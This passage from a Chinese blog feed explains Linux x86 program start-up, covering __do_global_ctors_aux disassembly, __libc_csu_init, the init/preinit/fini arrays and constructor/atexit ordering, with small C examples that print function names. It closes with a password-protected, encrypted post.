ret</span><br></pre></td></tr></table></figure><p><strong>函数调用的源代码</strong></p><p>它位于GCC源码中的gcc/crtstuff.c里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__do_global_ctors_aux (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  func_ptr *p;</span><br><span class="line">  <span class="keyword">for</span> (p = __CTOR_END__ - <span class="number">1</span>; *p != (func_ptr) <span class="number">-1</span>; p--)</span><br><span class="line">    (*p) ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析一下这个函数</p><p>先初始化了一个指针，p的值被初始化成<code>__CTOR_END__</code>-1。也就是指针向上移动一个指针或4个字节。</p><p>直到指针的值不等于-1，否则就每次调用这个函数，并使指针上移。</p><p>很明显，我们可以看到指针数组里面起始应该是[-1,xxx,xxx,xxx,…]xxx为函数指针</p><p><strong>汇编</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;__do_global_ctors_aux&gt;:</span><br><span class="line"> 8048450:       55                      push   %ebp</span><br><span class="line"> 8048451:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048453:       53                      push   %ebx</span><br><span class="line"> 8048454:       83 ec 04                sub    $0x4,%esp</span><br><span class="line"> 8048457:       a1 14 9f 04 08          mov    0x8049f14,%eax</span><br><span class="line"> 804845c:       83 f8 ff                cmp    $0xffffffff,%eax</span><br><span class="line"> 804845f:       74 13                   je     8048474 &lt;__do_global_ctors_aux+0x24&gt;</span><br><span class="line"> 8048461:       bb 14 9f 04 08          mov    $0x8049f14,%ebx</span><br><span class="line"> 8048466:       66 90                   xchg   %ax,%ax</span><br><span class="line"> 8048468:       83 eb 04                sub    $0x4,%ebx</span><br><span class="line"> 804846b:       ff d0                   call   *%eax</span><br><span class="line"> 804846d:       8b 03                   mov    (%ebx),%eax</span><br><span class="line"> 804846f:       83 f8 ff                cmp    $0xffffffff,%eax</span><br><span class="line"> 8048472:       75 f4                   jne    8048468 &lt;__do_global_ctors_aux+0x18&gt;</span><br><span class="line"> 8048474:       83 c4 04                add    $0x4,%esp</span><br><span class="line"> 8048477:       5b                      pop    %ebx</span><br><span class="line"> 8048478:       5d                      pop    %ebp</span><br><span class="line"> 8048479:       c3                      ret</span><br></pre></td></tr></table></figure><p>分析一下</p><ol><li>先初始化栈，然后压入ebx。虽然我们可以看到在栈上开辟了变量空间，但我们并未使用过它。我们将p保存到了ebx中，*p保存到了eax中。</li><li>之后按照我们理解就是给p赋值，但这里编译器做了一些优化。编译器直接将<em>(__CTOR_END__-1)赋值给了eax,也就是0x8049f14。<em>*这里还要注意一下$后面跟数字才是立即数，而不带$，直接写数字意思是这个地址指向的内容</em></em>。</li><li>上面那段话其实就是间接寻址。就是将那个地址里面的内容放入eax中，然后和-比较，相等就跳转，否则进入循环。</li><li>接下来，我们将立即数0x8049f14放入了ebx中，然后执行了<code>xchg   %ax,%ax</code>，这句话就是一个空指令，相当于是NOP。好处：在这种情况下，使循环开始于<code>8048468</code>，而不是<code>8048466</code>。这么做的好处是使循环开始的地方以4字节对齐，这样整个循环将会极大可能的被保存到一个cache line里，而不会被分成两段，从而起到加速执行的作用。</li><li>然后就是进行循环了，ebx减4，调用eax里保存的地址的函数，然后和-1进行比较，继续循环。</li><li>最后就是执行完毕，返回<code>_init</code>，最后返回到<code>__libc_csu_init</code>中</li></ol><h2 id="0x08-Back-up-to-libc-csu-init"><a href="#0x08-Back-up-to-libc-csu-init" class="headerlink" title="0x08 Back up to __libc_csu_init__"></a>0x08 Back up to <strong>__libc_csu_init__</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_csu_init (<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  _init ();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> <span class="built_in">size</span> = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚刚我们已经看到了__init里面的内容，但下面这个数组是干什么的呢？</p><p>这里借用别人翻译的：</p><p>这时刚刚从运行我们自定义的构造函数的<code>_init</code>函数返回，这意味着，在这个数组里面的内容将会在构造函数完成之后运行。你能通过某种方式告诉编译器你想在这个阶段运行某个你自定义的函数。这个函数也会收到和main函数相同的参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br></pre></td></tr></table></figure><h2 id="0x09-At-the-end"><a href="#0x09-At-the-end" class="headerlink" title="0x09 At the end"></a>0x09 At the end</h2><p>当<code>__libc_csu_init</code>函数运行结束后，就返回了<code>__libc_start_main</code>。</p><p>这个函数调用了我们的main函数，然后将main函数的返回值传递给了exit函数。</p><p>最后exit函数运行按照注册顺序依次运行了在at_exit()中注册的函数。</p><p>然后会运行另外一个循环，这次的循环是在<code>__fini_</code>数组中定义的。在运行完这些函数之后，就会调用析构函数。</p><h2 id="0x10-Summary"><a href="#0x10-Summary" class="headerlink" title="0x10 Summary"></a>0x10 Summary</h2><p><img src="/2021/06/02/Linux-x86-Program/callgraph.png" alt="image of the callgraph for all the routines involved in program startup on linux"></p><p>上面这个图片也让我们理清了思路</p><ol><li>首先进入<code>_start</code>，然后进入<code>__libc_start_mian</code>。</li><li>在<code>__libc_start_main</code>中，分成了三部分<code>__libc_csu_init</code> <code>main</code>和<code>exit</code></li><li>最先进行的当然就是<code>__libc_csu_init</code>中的<code>_init</code>，主要是进行地址无关化，是否输出gmon.out和是否调用<code>__register_fram_info</code>，还有最重要的构造函数。也就是我们说的<code>__attribute__ ((constructor)) constructor()</code>。</li><li>在执行完这个之后呢，就会退回到<code>__libc_csu_init</code>中，看其中的数组中我们自定义的函数，然后运行。</li><li>之后呢就进入我们熟知的主函数，执行主函数的内容。</li><li>最后就是执行<code>exit</code>，当然这里面有<code>at_exit</code>和我们自定义写的函数，以及析构函数</li></ol><p>最后，我们来看两个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preinit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fini</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br><span class="line">__attribute__((section(<span class="string">".preinit_array"</span>))) typeof(preinit) *__preinit = preinit;</span><br><span class="line">__attribute__((section(<span class="string">".fini_array"</span>))) typeof(fini) *__fini = fini;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>  __attribute__ ((constructor)) constructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((destructor)) destructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> atexit(my_atexit);</span><br><span class="line"> atexit(my_atexit2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">preinit</span></span><br><span class="line"><span class="comment">init</span></span><br><span class="line"><span class="comment">constructor</span></span><br><span class="line"><span class="comment">my_atexit2</span></span><br><span class="line"><span class="comment">my_atexit</span></span><br><span class="line"><span class="comment">destructor</span></span><br><span class="line"><span class="comment">fini</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//hook.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>  __attribute__ ((constructor)) constructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((destructor)) destructor() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">my_atexit2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preinit</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fini</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">".init_array"</span>))) typeof(init) *__init = init;</span><br><span class="line">__attribute__((section(<span class="string">".preinit_array"</span>))) typeof(preinit) *__preinit = preinit;</span><br><span class="line">__attribute__((section(<span class="string">".fini_array"</span>))) typeof(fini) *__fini = fini;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> atexit(my_atexit);</span><br><span class="line"> atexit(my_atexit2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">preinit</span></span><br><span class="line"><span class="comment">constructor</span></span><br><span class="line"><span class="comment">init</span></span><br><span class="line"><span class="comment">my_atexit2</span></span><br><span class="line"><span class="comment">my_atexit</span></span><br><span class="line"><span class="comment">fini</span></span><br><span class="line"><span class="comment">destructor</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure><p>调试后发现<code>constructor</code>和<code>init</code>是在一个段内，所以就是谁先定义执行谁。</p><p><img src="/2021/06/02/Linux-x86-Program/%7BIZ%5DTML%7DSRD22%5BD8DB%7BO_KQ.png" alt="img"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener">Linux x86 Program Start Up (dbp-consulting.com)</a></p><p><a href="https://blog.csdn.net/luomuxiaoxiao98/article/details/84955700" target="_blank" rel="noopener">Linux X86 程序启动 – main函数是如何被执行的？_luomuxiaoxiao98的专栏-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Linux-x86-Program-Start-Up&quot;&gt;&lt;a href=&quot;#Linux-x86-Program-Start-Up&quot; class=&quot;headerlink&quot; title=&quot;Linux x86 Program Start Up&quot;&gt;&lt;/a&gt;Linux x86 Program Start Up&lt;/h1&gt;&lt;p&gt;我们只关注x86的程序&lt;/p&gt;</summary>
    
    
    
    
    <category term="Linux" scheme="https://pz1o.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>面试</title>
    <link href="https://pz1o.top/2021/06/02/%E9%9D%A2%E8%AF%95/"/>
    <id>https://pz1o.top/2021/06/02/%E9%9D%A2%E8%AF%95/</id>
    <published>2021-06-02T08:36:10.000Z</published>
    <updated>2021-06-02T14:04:24.239Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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